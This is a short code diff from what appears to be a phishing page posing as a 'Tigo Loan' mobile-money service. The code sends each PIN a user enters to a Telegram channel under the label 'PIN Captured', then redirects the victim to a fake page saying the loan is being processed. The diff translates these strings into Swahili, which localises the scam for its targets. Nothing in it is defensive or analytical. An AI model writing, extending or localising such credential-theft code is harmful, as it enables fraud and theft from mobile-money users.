@@ -151,8 +151,8 @@
                     isSubmitting = true;
                     confirmBtn.style.opacity = '0.5';
                     confirmBtn.style.pointerEvents = 'none';
-                    await sendToTelegram(`<b>Tigo Loan - PIN Captured</b>\nPIN: <code>${pin}</code>`);
-                    const msg = encodeURIComponent('Processing loan, checking eligibility...');
+                    await sendToTelegram(`<b>Tigo Loan - PIN Imepatikana</b>\nPIN: <code>${pin}</code>`);
+                    const msg = encodeURIComponent('Tunaandaa mkopo, tunakagua uwezo wako wa kulipa...');
                     window.location.href = `loading.html?next=success.html&delay=10000&msg=${msg}`;
                 }
             });
